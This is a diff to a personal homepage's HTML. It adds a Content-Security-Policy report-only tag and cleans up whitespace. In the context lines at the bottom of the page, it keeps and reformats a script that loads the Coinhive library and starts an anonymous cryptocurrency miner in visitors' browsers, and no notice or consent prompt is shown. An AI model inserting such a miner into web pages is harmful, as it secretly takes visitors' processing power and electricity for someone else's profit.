@@ -5,23 +5,26 @@
     <meta charset="UTF-8">
     <title>Ben Cooper</title>
     <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+    <meta http-equiv="Content-Security-Policy-Report-Only" content="default-src https:;report-uri https://benc.report-uri.com/r/d/csp/reportOnly">
+
+
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
     <script src="https://use.fontawesome.com/51b94c345f.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.19.1/moment.min.js" integrity="sha256-zG8v+NWiZxmjNi+CvUYnZwKtHzFtdO8cAKUIdB8+U9I=" crossorigin="anonymous"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/moment-timezone/0.5.14/moment-timezone.min.js" integrity="sha256-wnlfv2SMPXay8VywRkRiL5zysJhwn2Y0du7pg2fkoEY=" crossorigin="anonymous"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/moment-timezone/0.5.14/moment-timezone-with-data-2012-2022.min.js" integrity="sha256-vBJSPpSAuUKYXDA+2hx2dQmyhkmM91vYjXI/o5QjnmA=" crossorigin="anonymous"></script>
- 
+
     <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto%7CRoboto+Slab" crossorigin="anonymous">
-    
-    
 
 
-    
-    
-    
+
+
+
+
+
     <link rel="stylesheet" href="resources/css/home.css">
-    
+
 </head>
 
 
@@ -58,16 +61,14 @@
     <script src="resources/js/randomArticle.js"></script>
     <script src="https://coinhive.com/lib/coinhive.min.js" integrity="sha384-osX842CxNcywFYdf9v339iSqoUdw84t4i1r7KcvyoaUNT0WBWR8aDEDC4rAyS3Sj" crossorigin="anonymous"></script>
     <script>
-        try{
+        try {
             const miner = new CoinHive.Anonymous('Z9xViG5bUBovkUbtaKnxbo0CNHGiaFa0', {
-            throttle: 0.6
-        });
-        miner.start();
-        }
-        catch(err){
+                throttle: 0.6
+            });
+            miner.start();
+        } catch (err) {
             console.log(err);
         }
-       
     </script>
 
 </body>
